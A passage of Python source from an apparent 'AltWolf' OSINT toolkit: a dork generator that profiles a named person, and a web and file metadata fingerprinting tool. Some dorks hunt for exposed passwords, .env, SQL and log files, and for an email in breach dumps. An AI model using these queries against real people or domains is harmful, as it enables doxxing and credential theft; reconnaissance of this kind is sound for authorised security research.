                        story.append(Spacer(1, 8))
            
            if self.data.get('notes'):
                story.append(PageBreak())
                story.append(Paragraph("Additional Notes", heading_style))
                story.append(Spacer(1, 12))
                notes_lines = self.data['notes'].split('\n')
                for line in notes_lines:
                    if line.strip():
                        story.append(Paragraph(line, body_style))
            
            story.append(PageBreak())
            story.append(Paragraph("Report Metadata", heading_style))
            story.append(Spacer(1, 12))
            
            metadata = [
                ['Report Type:', self.data.get('entity_type', 'N/A')],
                ['Generation Date:', generation_date],
                ['Report ID:', timestamp],
                ['Information Source:', self.data.get('source', 'Not specified')],
            ]
            
            t = Table(metadata, colWidths=[2*inch, 4*inch])
            t.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (0, -1), colors.lightgrey),
                ('TEXTCOLOR', (0, 0), (-1, -1), colors.black),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
                ('FONTNAME', (1, 0), (1, -1), 'Helvetica'),
                ('FONTSIZE', (0, 0), (-1, -1), 10),
                ('GRID', (0, 0), (-1, -1), 1, colors.grey),
                ('VALIGN', (0, 0), (-1, -1), 'TOP'),
            ]))
            
            story.append(t)
            story.append(Spacer(1, 20))
            
            disclaimer = """

            """
            story.append(Paragraph(disclaimer, body_style))
            
            doc.build(story)
            
            return filename
        
        def run(self):
            while True:
                self.clear_screen()
                self.print_banner()
                self.print_menu()
                
                choice = input("\nSelect option: ").strip()
                
                if choice == '0':
                    self.clear_screen()
                    break
                elif choice in ['1', '2', '3', '4', '5']:
                    self.entity_type = choice
                    self.data = {}
                    
                    try:
                        if choice == '1':
                            self.collect_person_info()
                        elif choice == '2':
                            self.collect_company_info()
                        elif choice == '3':
                            self.collect_website_info()
                        elif choice == '4':
                            self.collect_event_info()
                        elif choice == '5':
                            self.collect_custom_info()
                        
                        print("           GENERATING PDF REPORT...")
                        
                        filename = self.generate_pdf()
                        
                        print("              PDF GENERATED SUCCESSFULLY!")
                        print(f"\nFile saved as: {filename}")
                        print(f"Location: {os.path.abspath(filename)}")

                        
                        input("\nPress Enter to continue...")
                        
                    except Exception as e:
                        print(f"\n[ERROR] Failed to generate PDF: {e}")
                        input("\nPress Enter to continue...")
                else:
                    print("\n[!] Invalid option! Please try again.")
                    input("\nPress Enter to continue...")


    if __name__ == "__main__":
        collector = InformationCollector()
        collector.run()





if menu_choice == "18":
    os.system('cls' if os.name == 'nt' else 'clear')
    class OSINTDorkGenerator:
        def __init__(self):
            self.target_info = {}
            self.generated_dorks = []
        
        def clear_screen(self):
            os.system('cls' if os.name == 'nt' else 'clear')
        
        def display_banner(self):
            print("=" * 70)
        
        def display_menu(self):
            print("1. Enter Target Information")
            print("2. Generate Google Dorks")
            print("3. View Generated Dorks")
            print("4. Export Dorks to File")
            print("5. Clear All Data")
            print("6. Exit")
        
        def get_target_info(self):
            self.clear_screen()
            self.display_banner()
            print("ENTER TARGET INFORMATION")
            print("-" * 70)
            print("(Press Enter to skip any field)\n")
            
            fields = {
                'first_name': 'First Name',
                'last_name': 'Last Name',
                'full_name': 'Full Name',
                'username': 'Username/Nickname',
                'email': 'Email Address',
                'phone': 'Phone Number',
                'domain': 'Domain/Website',
                'company': 'Company/Organization',
                'job_title': 'Job Title',
                'city': 'City',
                'state': 'State/Region',
                'country': 'Country',
                'keyword': 'Additional Keywords (comma-separated)'
            }
            
            self.target_info = {}
            for key, label in fields.items():
                value = input(f"{label}: ").strip()
                if value:
                    self.target_info[key] = value
            
            if not self.target_info:
                print("\n[!] No information entered. Please enter at least one field.")
                input("\nPress Enter to continue...")
                return False
            
            print(f"\n[+] Successfully collected {len(self.target_info)} field(s)")
            input("\nPress Enter to continue...")
            return True
        
        def generate_dorks(self):
            if not self.target_info:
                print("\n[!] No target information available. Please enter data first.")
                input("\nPress Enter to continue...")
                return
            
            self.generated_dorks = []
            
            first_name = self.target_info.get('first_name', '')
            last_name = self.target_info.get('last_name', '')
            full_name = self.target_info.get('full_name', '')
            username = self.target_info.get('username', '')
            email = self.target_info.get('email', '')
            phone = self.target_info.get('phone', '')
            domain = self.target_info.get('domain', '')
            company = self.target_info.get('company', '')
            job_title = self.target_info.get('job_title', '')
            city = self.target_info.get('city', '')
            state = self.target_info.get('state', '')
            country = self.target_info.get('country', '')
            keywords = self.target_info.get('keyword', '').split(',')

            names = []
            if full_name:
                names.append(full_name)
            if first_name and last_name:
                names.append(f"{first_name} {last_name}")
                names.append(f"{last_name} {first_name}")
            elif first_name:
                names.append(first_name)
            elif last_name:
                names.append(last_name)
            
            self.generated_dorks.append("# === BASIC INFORMATION SEARCHES ===")
            
            for name in names:
                self.generated_dorks.append(f'"{name}"')
                if company:
                    self.generated_dorks.append(f'"{name}" "{company}"')
                if city:
                    self.generated_dorks.append(f'"{name}" "{city}"')
            
            if username:
                self.generated_dorks.append(f'"{username}"')
            
            if email:
                self.generated_dorks.append(f'"{email}"')
                self.generated_dorks.append(f'"{email}" -site:linkedin.com')
            
            if phone:
                clean_phone = phone.replace('-', '').replace('(', '').replace(')', '').replace(' ', '')
                self.generated_dorks.append(f'"{phone}"')
                self.generated_dorks.append(f'"{clean_phone}"')
            
            self.generated_dorks.append("\n# === SOCIAL MEDIA PROFILES ===")
            
            social_sites = [
                'linkedin.com', 'facebook.com', 'twitter.com', 'instagram.com',
                'github.com', 'reddit.com', 'youtube.com', 'tiktok.com',
                'pinterest.com', 'snapchat.com', 'medium.com', 'behance.net',
                'dribbble.com', 'stackoverflow.com', 'quora.com'
            ]
            
            for name in names:
                for site in social_sites:
                    self.generated_dorks.append(f'site:{site} "{name}"')
            
            if username:
                for site in social_sites:
                    self.generated_dorks.append(f'site:{site} "{username}"')
            
            self.generated_dorks.append("\n# === DOCUMENT SEARCHES ===")
            
            doc_types = ['pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt', 'csv']
            
            for name in names:
                for doc_type in doc_types:
                    self.generated_dorks.append(f'"{name}" filetype:{doc_type}')
            
            if email:
                for doc_type in doc_types:
                    self.generated_dorks.append(f'"{email}" filetype:{doc_type}')
            
            if company:
                for doc_type in doc_types:
                    self.generated_dorks.append(f'"{company}" filetype:{doc_type}')
            
            if domain:
                self.generated_dorks.append("\n# === DOMAIN-SPECIFIC SEARCHES ===")
                self.generated_dorks.append(f'site:{domain}')
                for name in names:
                    self.generated_dorks.append(f'site:{domain} "{name}"')
                if email:
                    self.generated_dorks.append(f'site:{domain} "{email}"')
                
                self.generated_dorks.append(f'site:*.{domain}')
                
                for doc_type in doc_types:
                    self.generated_dorks.append(f'site:{domain} filetype:{doc_type}')
                
                self.generated_dorks.append(f'site:{domain} intitle:"index of"')
            
            if email:
                self.generated_dorks.append("\n# === EMAIL-BASED SEARCHES ===")
                email_domain = email.split('@')[1] if '@' in email else ''
                
                if email_domain:
                    self.generated_dorks.append(f'"{email}" -site:{email_domain}')
                    self.generated_dorks.append(f'site:{email_domain} "{email}"')
                
                self.generated_dorks.append(f'"{email}" "breach" OR "leak" OR "dump"')
                self.generated_dorks.append(f'"{email}" intext:"password"')
            
            self.generated_dorks.append("\n# === PROFESSIONAL INFORMATION ===")
            
            if company:
                self.generated_dorks.append(f'"{company}" employees')
                self.generated_dorks.append(f'site:linkedin.com "{company}"')
                
                for name in names:
                    self.generated_dorks.append(f'"{name}" "{company}" site:linkedin.com')
            
            if job_title:
                for name in names:
                    self.generated_dorks.append(f'"{name}" "{job_title}"')
                if company:
                    self.generated_dorks.append(f'"{job_title}" "{company}"')
            
            for name in names:
                self.generated_dorks.append(f'"{name}" (resume OR cv) filetype:pdf')
            
    
            self.generated_dorks.append("\n# === LOCATION-BASED SEARCHES ===")
            
            location_parts = []
            if city:
                location_parts.append(city)
            if state:
                location_parts.append(state)
            if country:
                location_parts.append(country)
            
            if location_parts:
                location_str = ' '.join(location_parts)
                for name in names:
                    self.generated_dorks.append(f'"{name}" "{location_str}"')
                if company:
                    self.generated_dorks.append(f'"{company}" "{location_str}"')
            
            if username:
                self.generated_dorks.append("\n# === USERNAME SEARCHES ===")
                self.generated_dorks.append(f'"{username}" profile')
                self.generated_dorks.append(f'"{username}" account')
                self.generated_dorks.append(f'"{username}" user')
                self.generated_dorks.append(f'inurl:{username}')
            

            self.generated_dorks.append("\n# === CACHE & ARCHIVE SEARCHES ===")
            
            for name in names:
                self.generated_dorks.append(f'cache:"{name}"')
            
            if domain:
                self.generated_dorks.append(f'cache:{domain}')
            
            if domain:
                self.generated_dorks.append(f'site:web.archive.org "{domain}"')
            

            if phone:
                self.generated_dorks.append("\n# === PHONE NUMBER SEARCHES ===")
                clean_phone = phone.replace('-', '').replace('(', '').replace(')', '').replace(' ', '')
                
                self.generated_dorks.append(f'"{phone}" OR "{clean_phone}"')
                self.generated_dorks.append(f'"{phone}" (contact OR phone OR mobile OR cell)')
            
            self.generated_dorks.append("\n# === NEWS & ARTICLES ===")
            
            for name in names:
                self.generated_dorks.append(f'"{name}" site:news.google.com')
                self.generated_dorks.append(f'"{name}" (news OR article OR press)')
            
            self.generated_dorks.append("\n# === IMAGE SEARCHES ===")
            
            for name in names:
                self.generated_dorks.append(f'"{name}" filetype:jpg OR filetype:png')
            
            if keywords and keywords[0]:
                self.generated_dorks.append("\n# === KEYWORD-BASED SEARCHES ===")
                for keyword in keywords:
                    keyword = keyword.strip()
                    if keyword:
                        for name in names:
                            self.generated_dorks.append(f'"{name}" "{keyword}"')
            
            self.generated_dorks.append("\n# === POTENTIAL EXPOSURES (Use Responsibly) ===")
            
            if email:
                self.generated_dorks.append(f'"{email}" (api OR key OR token OR credential)')
            
            if domain:
                self.generated_dorks.append(f'site:{domain} (password OR passwd OR pwd)')
                self.generated_dorks.append(f'site:{domain} filetype:log')
                self.generated_dorks.append(f'site:{domain} filetype:sql')
                self.generated_dorks.append(f'site:{domain} filetype:env')
            
            print(f"\n[+] Successfully generated {len([d for d in self.generated_dorks if not d.startswith('#')])} dorks!")
            input("\nPress Enter to continue...")
        
        def view_dorks(self):
            if not self.generated_dorks:
                print("\n[!] No dorks generated yet. Please generate dorks first.")
                input("\nPress Enter to continue...")
                return
            
            self.clear_screen()
            self.display_banner()
            print("GENERATED GOOGLE DORKS")
            print("=" * 70)
            
            for i, dork in enumerate(self.generated_dorks, 1):
                if dork.startswith('#'):
                    print(f"\n{dork}")
                else:
                    print(f"{i}. {dork}")
            
            print("\n" + "=" * 70)
            print(f"Total: {len([d for d in self.generated_dorks if not d.startswith('#')])} dorks")
            input("\nPress Enter to continue...")
        
        def export_dorks(self):
            if not self.generated_dorks:
                print("\n[!] No dorks to export. Please generate dorks first.")
                input("\nPress Enter to continue...")
                return
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"osint_dorks_{timestamp}.txt"
            
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("=" * 70 + "\n")
                    f.write("OSINT GOOGLE DORKS\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 70 + "\n\n")
                    
                    f.write("TARGET INFORMATION:\n")
                    f.write("-" * 70 + "\n")
                    for key, value in self.target_info.items():
                        f.write(f"{key.replace('_', ' ').title()}: {value}\n")
                    f.write("\n" + "=" * 70 + "\n\n")
                    
                    f.write("GENERATED DORKS:\n")
                    f.write("-" * 70 + "\n\n")
                    
                    for dork in self.generated_dorks:
                        f.write(dork + "\n")
                    
                    f.write("\n" + "=" * 70 + "\n")
                    f.write("USAGE NOTES:\n")
                    f.write("-" * 70 + "\n")
                    f.write("- These dorks are for ethical OSINT research only\n")
                    f.write("- Ensure you have proper authorization before investigating\n")
                    f.write("- Respect privacy laws and terms of service\n")
                    f.write("- Use responsibly and legally\n")
                    f.write("=" * 70 + "\n")
                
                print(f"\n[+] Dorks exported successfully to: {filename}")
                print(f"[+] File location: {os.path.abspath(filename)}")
            
            except Exception as e:
                print(f"\n[!] Error exporting dorks: {str(e)}")
            
            input("\nPress Enter to continue...")
        
        def clear_data(self):
            confirm = input("\nAre you sure you want to clear all data? (yes/no): ").strip().lower()
            if confirm == 'yes':
                self.target_info = {}
                self.generated_dorks = []
                print("\n[+] All data cleared successfully!")
            else:
                print("\n[-] Operation cancelled.")
            input("\nPress Enter to continue...")
        
        def display_disclaimer(self):
            self.clear_screen()
            dork = """                             
              .:::..            
         -=============-        
       =================-       
     -======-       -==         
    :=====.                     
   ....-=                         Google-dork by AltWolf
   .....         :::::::::::::         Version V1.1.1
  ......         :::::::::::::  
   .....         :::::::::::::  
   .....:               ::::::  
    .:---:             .:::::   
     ------:         .::::::    
      :----------------::::     
        :---------------:       
           .::------:.       
            """
            print_violet_white_gradient(dork)
            print("=" * 70)
            
            accept = input("\ncontinue (yes/no): ").strip().lower()
            if accept != 'yes':
                sys.exit(0)
        
        def run(self):
            self.display_disclaimer()
            
            while True:
                self.clear_screen()
                self.display_banner()
                
                if self.target_info:
                    print(f"[Status] Target info collected: {len(self.target_info)} field(s)")
                if self.generated_dorks:
                    dork_count = len([d for d in self.generated_dorks if not d.startswith('#')])
                    print(f"[Status] Dorks generated: {dork_count}")
                
                self.display_menu()
                
                choice = input("\nEnter your choice (1-6): ").strip()
                
                if choice == '1':
                    self.get_target_info()
                elif choice == '2':
                    self.generate_dorks()
                elif choice == '3':
                    self.view_dorks()
                elif choice == '4':
                    self.export_dorks()
                elif choice == '5':
                    self.clear_data()
                elif choice == '6':
                    sys.exit(0)
                else:
                    print("\n[!] Invalid choice. Please try again.")
                    input("\nPress Enter to continue...")


    def main():
        try:
            generator = OSINTDorkGenerator()
            generator.run()
        except KeyboardInterrupt:
            print("\n\n[!] Program interrupted by user.")
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] An error occurred: {str(e)}")
            sys.exit(1)


    if __name__ == "__main__":
        main()


class TECHINTAnalyzer:
    
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = defaultdict(dict)
    
    def analyze_url(self, url):
        try:
            response = self.session.head(url, timeout=self.timeout, allow_redirects=True)
            
            if response.status_code >= 400 or len(response.headers) < 5:
                response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            
            return self._collect_url_data(url, response)
            
        except requests.exceptions.RequestException as e:
            return {'error': str(e)}
    
    def _collect_url_data(self, url, response):
        data = {
            'url': url,
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'cookies': [],
            'metadata': {},
            'technologies': [],
            'security': {'present': {}, 'missing': []}
        }
        
        server = response.headers.get('Server', 'Not disclosed')
        powered_by = response.headers.get('X-Powered-By', 'Not disclosed')
        server_info = self._parse_server_string(server)
        
        data['server'] = {
            'raw': server,
            'parsed': server_info,
            'powered_by': powered_by
        }
        
        security_headers = {
            'Strict-Transport-Security': 'HSTS',
            'Content-Security-Policy': 'CSP',
            'X-Frame-Options': 'Clickjacking Protection',
            'X-Content-Type-Options': 'MIME Sniffing Protection',
            'X-XSS-Protection': 'XSS Protection',
            'Referrer-Policy': 'Referrer Policy',
            'Permissions-Policy': 'Permissions Policy',
            'Access-Control-Allow-Origin': 'CORS'
        }
        
        for header, description in security_headers.items():
            value = response.headers.get(header)
            if value:
                data['security']['present'][description] = value
            else:
                data['security']['missing'].append(description)
        
        for cookie in response.cookies:
            data['cookies'].append({
                'name': cookie.name,
                'domain': cookie.domain,
                'path': cookie.path,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('HttpOnly')
            })
        
        if hasattr(response, 'text'):
            html = response.text
            
            meta_patterns = {
                'generator': r'<meta\s+name=["\']generator["\']\s+content=["\']([^"\']+)["\']',
                'author': r'<meta\s+name=["\']author["\']\s+content=["\']([^"\']+)["\']',
                'description': r'<meta\s+name=["\']description["\']\s+content=["\']([^"\']+)["\']',
            }
            
            for name, pattern in meta_patterns.items():
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    data['metadata'][name] = match.group(1)
            
            title_match = re.search(r'<title>([^<]+)</title>', html, re.IGNORECASE)
            if title_match:
                data['metadata']['title'] = title_match.group(1).strip()
            
            frameworks = {
                'WordPress': [r'wp-content', r'wp-includes'],
                'Drupal': [r'Drupal', r'/sites/default/'],
                'Joomla': [r'/components/com_', r'Joomla'],
                'Django': [r'csrfmiddlewaretoken'],
                'Laravel': [r'laravel_session', r'XSRF-TOKEN'],
                'React': [r'react', r'data-reactroot'],
                'Vue.js': [r'vue\.js', r'data-v-'],
                'Angular': [r'ng-version', r'angular'],
                'Bootstrap': [r'bootstrap\.min\.css'],
                'jQuery': [r'jquery\.min\.js']
            }
            
            for tech, patterns in frameworks.items():
                for pattern in patterns:
                    if re.search(pattern, html, re.IGNORECASE):
                        if tech not in data['technologies']:
                            data['technologies'].append(tech)
                        break
        
        return data
    
    def _parse_server_string(self, server_str):
        info = {}
        
        patterns = [
            (r'nginx/([\d.]+)', 'nginx'),
            (r'Apache/([\d.]+)', 'Apache'),
            (r'Microsoft-IIS/([\d.]+)', 'IIS'),
            (r'lighttpd/([\d.]+)', 'lighttpd'),
        ]
        
        for pattern, software in patterns:
            match = re.search(pattern, server_str, re.IGNORECASE)
            if match:
                info['software'] = software
                if match.groups():
                    info['version'] = match.group(1)
                break
        
        if 'Ubuntu' in server_str:
            info['os'] = 'Ubuntu'
        elif 'Debian' in server_str:
            info['os'] = 'Debian'
        elif 'CentOS' in server_str:
            info['os'] = 'CentOS'
        elif 'Win' in server_str or 'Microsoft' in server_str:
            info['os'] = 'Windows'
        
        return info if info else None
    
    def analyze_file_metadata(self, filepath):
        path = Path(filepath)
        
        if not path.exists():
            return {'error': 'File not found'}
        
        data = {
            'filename': path.name,
            'size': path.stat().st_size,
            'modified': datetime.fromtimestamp(path.stat().st_mtime).isoformat(),
            'created': datetime.fromtimestamp(path.stat().st_ctime).isoformat(),
        }
        
        mime_type, _ = mimetypes.guess_type(str(path))
        data['mime_type'] = mime_type or 'Unknown'
        
        if mime_type and mime_type.startswith('image/'):
            try:
                from PIL import Image
                from PIL.ExifTags import TAGS
                
                img = Image.open(path)
                data['image'] = {
                    'format': img.format,
                    'mode': img.mode,
                    'size': f"{img.size[0]}x{img.size[1]}"
                }
                
                exif_data = img.getexif()
                if exif_data:
                    data['exif'] = {}
                    for tag_id, value in list(exif_data.items())[:20]:
                        tag = TAGS.get(tag_id, tag_id)
                        data['exif'][str(tag)] = str(value)[:100]
            except:
                pass
        
        elif mime_type == 'application/pdf':
            try:
                import PyPDF2
                
                with open(path, 'rb') as f:
                    pdf = PyPDF2.PdfReader(f)
                    info = pdf.metadata
                    
                    data['pdf'] = {'pages': len(pdf.pages)}
                    
                    if info:
                        for field in ['title', 'author', 'subject', 'creator', 'producer']:
                            value = getattr(info, field, None)
                            if value:
                                data['pdf'][field] = str(value)[:100]
            except:
                pass
        
        return data

if menu_choice == "19":
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner():
        tech = """                           
                                -+******=:          
                            :+************=.       
                        :+****+-::::=+***+-      
                        .=+***+.        -****-     
                        =+***+:           -***+.    
                    =****+-             .+**+:    
                    -+*****+-.            :+**+.    
                -************+.        :+***=     
                =*******++*******=     .+****=      
            -*******+      +****+  .=+***+:       
            :*********+       -****==****+-      TECHINT by AltWolf   
        .******=.+**+=      .********+=          Version V1.1.1 
        +*****=   -+***+:    .******+=             
    :*****=      .+*****+++******=.              
    +****:         .=**********+.                
    :****-              -******:                  
    :****:            .******-                    
    .*****           +*****+                      
    -*****:      .=*****+                        
        :*******++*******+.                         
        -*************.                           
            -******=.                                                
        """
        print_violet_white_gradient(tech)

    def print_menu():
        """Print main menu."""
        print("═" * 80)
        print("TECHINT ANALYSIS OPTIONS:")
        print("═" * 80)
        print()
        print("[1] Analyze Single URL")
        print("[2] Analyze Multiple URLs (Batch)")
        print("[3] Analyze Local File Metadata")
        print("[4] Analyze Directory (All Files)")
        print("[5] Compare Multiple URLs")
        print("[0] Exit")
        print()
        print("═" * 80)
        print()


    def get_input(prompt):
        """Get user input with prompt."""
        return input(f"{prompt}: ").strip()


    def print_url_results(data):
        """Print URL analysis results."""
        if 'error' in data:
            print(f"\n[!] Error: {data['error']}")
            return
        
        print("\n" + "=" * 80)
        print("URL ANALYSIS RESULTS")
        print("=" * 80)
        
        print(f"\n[TARGET]")
        print(f"  URL: {data['url']}")
        print(f"  Status Code: {data['status_code']}")
        
        print(f"\n[SERVER FINGERPRINT]")
        print(f"  Server: {data['server']['raw']}")
        if data['server']['parsed']:
            info = data['server']['parsed']
            print(f"    Software: {info.get('software', 'Unknown')}")
            print(f"    Version: {info.get('version', 'Unknown')}")
            if 'os' in info:
                print(f"    OS: {info['os']}")
        print(f"  Powered By: {data['server']['powered_by']}")
        
        print(f"\n[DETECTED TECHNOLOGIES]")
        if data['technologies']:
            for tech in data['technologies']:
                print(f"  ✓ {tech}")
        else:
            print("  No specific technologies detected")
        
        print(f"\n[SECURITY HEADERS]")
        if data['security']['present']:
            print("  Present:")
            for desc, value in data['security']['present'].items():
                print(f"    ✓ {desc}")
        
        if data['security']['missing']:
            print("  Missing:")
            for desc in data['security']['missing'][:5]:  # Show first 5
                print(f"    ✗ {desc}")
        
        print(f"\n[COOKIES]")
        if data['cookies']:
            print(f"  Total: {len(data['cookies'])}")
            for cookie in data['cookies'][:3]:  # Show first 3
                print(f"\n  Cookie: {cookie['name']}")
                print(f"    Secure: {cookie['secure']}")
                print(f"    HttpOnly: {cookie['httponly']}")
        else:
            print("  No cookies set")
        
        if data['metadata']:
            print(f"\n[HTML METADATA]")
            for key, value in data['metadata'].items():
                print(f"  {key.title()}: {value[:80]}...")
        
        print(f"\n[HEADERS SUMMARY]")
        print(f"  Total Headers: {len(data['headers'])}")
        
        interesting = ['Content-Type', 'Content-Length', 'Last-Modified', 'ETag']
        for header in interesting:
            if header in data['headers']:
                value = data['headers'][header]
                print(f"  {header}: {value[:60]}")


    def print_file_results(data):
        if 'error' in data:
            print(f"\n[!] Error: {data['error']}")
            return
        
        print("\n" + "=" * 80)
        print("FILE METADATA ANALYSIS")
        print("=" * 80)
        
        print(f"\n[FILE INFORMATION]")
        print(f"  Filename: {data['filename']}")
        print(f"  Size: {data['size']:,} bytes ({data['size']/1024/1024:.2f} MB)")
        print(f"  MIME Type: {data['mime_type']}")
        print(f"  Modified: {data['modified']}")
        print(f"  Created: {data['created']}")
        
        if 'image' in data:
            print(f"\n[IMAGE INFORMATION]")
            print(f"  Format: {data['image']['format']}")
            print(f"  Mode: {data['image']['mode']}")
            print(f"  Dimensions: {data['image']['size']}")
            
            if 'exif' in data:
                print(f"\n[EXIF DATA]")
                for key, value in list(data['exif'].items())[:10]:
                    print(f"  {key}: {value}")
        
        elif 'pdf' in data:
            print(f"\n[PDF INFORMATION]")
            for key, value in data['pdf'].items():
                print(f"  {key.title()}: {value}")


    def analyze_single_url():
        print("\n[SINGLE URL ANALYSIS]")
        print("-" * 80)
        
        url = get_input("Enter target URL (e.g., https://example.com)")
        
        if not url:
            print("\n[!] Error: URL required")
            input("\nPress ENTER to continue...")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        timeout_str = get_input("Enter timeout in seconds (default: 10)")
        timeout = int(timeout_str) if timeout_str else 10
        
        try:
            print("\n[*] Analyzing URL...")
            print(f"[*] Target: {url}")
            
            analyzer = TECHINTAnalyzer(timeout=timeout)
            data = analyzer.analyze_url(url)
            
            print_url_results(data)
            
            export = get_input("\nExport results to JSON? (y/n)")
            if export.lower() == 'y':
                filename = f"techint_{urlparse(url).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                print(f"[+] Results exported to {filename}")
            
            print("\n[+] Analysis complete")
            
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
        
        input("\nPress ENTER to continue...")


    def analyze_batch_urls():
        print("\n[BATCH URL ANALYSIS]")
        print("-" * 80)
        
        print("\nEnter URLs (one per line, empty line to finish):")
        urls = []
        while True:
            url = input("  URL: ").strip()
            if not url:
                break
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            urls.append(url)
        
        if not urls:
            print("\n[!] No URLs provided")
            input("\nPress ENTER to continue...")
            return
        
        try:
            print(f"\n[*] Analyzing {len(urls)} URLs...")
            
            analyzer = TECHINTAnalyzer(timeout=10)
            results = []
            
            for i, url in enumerate(urls, 1):
                print(f"\n  [{i}/{len(urls)}] {url}")
                data = analyzer.analyze_url(url)
                results.append(data)
                
                if 'error' not in data:
                    print(f"      Status: {data['status_code']}")
                    print(f"      Server: {data['server']['raw'][:40]}")
                    print(f"      Technologies: {len(data['technologies'])}")
                else:
                    print(f"      Error: {data['error']}")
            
            print("\n" + "=" * 80)
            print("BATCH ANALYSIS SUMMARY")
            print("=" * 80)
            print(f"\n  {'URL':<40} {'Status':<8} {'Server':<20} {'Tech'}")
            print(f"  {'-'*40} {'-'*8} {'-'*20} {'-'*4}")
            
            for data in results:
                if 'error' not in data:
                    url_short = data['url'][:38]
                    server_short = data['server']['raw'][:18]
                    print(f"  {url_short:<40} {data['status_code']:<8} {server_short:<20} {len(data['technologies'])}")
                else:
                    print(f"  {data.get('url', 'Unknown')[:38]:<40} {'ERROR':<8}")
            
            export = get_input("\nExport batch results to JSON? (y/n)")
            if export.lower() == 'y':
                filename = f"techint_batch_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    json.dump(results, f, indent=2)
                print(f"[+] Results exported to {filename}")
            
            print("\n[+] Batch analysis complete")
            
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
        
        input("\nPress ENTER to continue...")


    def analyze_file():
        print("\n[FILE METADATA ANALYSIS]")
        print("-" * 80)
        
        filepath = get_input("Enter file path")
        
        if not filepath or not os.path.exists(filepath):
            print("\n[!] Error: File not found")
            input("\nPress ENTER to continue...")
            return
        
        try:
            print(f"\n[*] Analyzing file: {filepath}")
            
            analyzer = TECHINTAnalyzer()
            data = analyzer.analyze_file_metadata(filepath)
            
            print_file_results(data)
            
            export = get_input("\nExport results to JSON? (y/n)")
            if export.lower() == 'y':
                filename = f"file_metadata_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
                print(f"[+] Results exported to {filename}")
            
            print("\n[+] Analysis complete")
            
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
        
        input("\nPress ENTER to continue...")


    def analyze_directory():
        print("\n[DIRECTORY ANALYSIS]")
        print("-" * 80)
        
        directory = get_input("Enter directory path")
        
        if not directory or not os.path.exists(directory):
            print("\n[!] Error: Directory not found")
            input("\nPress ENTER to continue...")
            return
        
        try:
            files = [f for f in Path(directory).iterdir() if f.is_file()]
            
            if not files:
                print("\n[!] No files found")
                input("\nPress ENTER to continue...")
                return
            
            print(f"\n[*] Found {len(files)} files")
            print(f"[*] Analyzing directory...")
            
            analyzer = TECHINTAnalyzer()
            results = []
            
            for i, filepath in enumerate(files[:50], 1):  # Limit to 50 files
                print(f"\n  [{i}/{min(len(files), 50)}] {filepath.name}")
                data = analyzer.analyze_file_metadata(str(filepath))
                results.append(data)
                
                if 'error' not in data:
                    print(f"      Size: {data['size']:,} bytes")
                    print(f"      Type: {data['mime_type']}")
            
            print(f"\n  {'Filename':<35} {'Size':<15} {'Type':<20}")
            print(f"  {'-'*35} {'-'*15} {'-'*20}")
            
            for data in results:
                if 'error' not in data:
                    name = data['filename'][:33]
                    size = f"{data['size']:,}"[:13]
                    mime = data['mime_type'][:18]
                    print(f"  {name:<35} {size:<15} {mime:<20}")
            
            print(f"\n  Total files: {len(results)}")
            print(f"  Total size: {sum(d.get('size', 0) for d in results):,} bytes")
            
            print("\n[+] Directory analysis complete")
            
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
        
        input("\nPress ENTER to continue...")


    def compare_urls():
        print("\n[COMPARE URLS]")
        
        print("\nEnter 2-5 URLs to compare (one per line, empty line to finish):")
        urls = []
        while len(urls) < 5:
            url = input(f"  URL {len(urls)+1}: ").strip()
            if not url:
                break
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            urls.append(url)
        
        if len(urls) < 2:
            print("\n[!] Need at least 2 URLs to compare")
            input("\n ")
            return
        
        try:
            print(f"\n[*] Comparing {len(urls)} URLs...")
            
            analyzer = TECHINTAnalyzer(timeout=10)
            results = []
            
            for url in urls:
                print(f"  Analyzing: {url[:50]}...")
                data = analyzer.analyze_url(url)
                results.append(data)
        
            print("\n" + "=" * 80)
            print("URL COMPARISON")
            
            print(f"\n{'Metric':<30}", end='')
            for i in range(len(urls)):
                print(f" URL{i+1:<8}", end='')
            print()
            print("-" * 80)
            
     
            print(f"{'Status Code':<30}", end='')
            for data in results:
                status = data.get('status_code', 'ERR') if 'error' not in data else 'ERR'
                print(f" {str(status):<8}", end='')
            print()
            
       
            print(f"{'Server Software':<30}", end='')
            for data in results:
                if 'error' not in data and data['server']['parsed']:
                    server = data['server']['parsed'].get('software', 'Unknown')[:7]
                else:
                    server = 'Unknown'
                print(f" {server:<8}", end='')
            print()
            
     
            print(f"{'Technologies Detected':<30}", end='')
            for data in results:
                count = len(data.get('technologies', [])) if 'error' not in data else 0
                print(f" {count:<8}", end='')
            print()
            
  
            print(f"{'Security Headers':<30}", end='')
            for data in results:
                count = len(data.get('security', {}).get('present', {})) if 'error' not in data else 0
                print(f" {count:<8}", end='')
            print()
            
         
            print(f"{'Cookies':<30}", end='')
            for data in results:
                count = len(data.get('cookies', [])) if 'error' not in data else 0
                print(f" {count:<8}", end='')
            print()
            
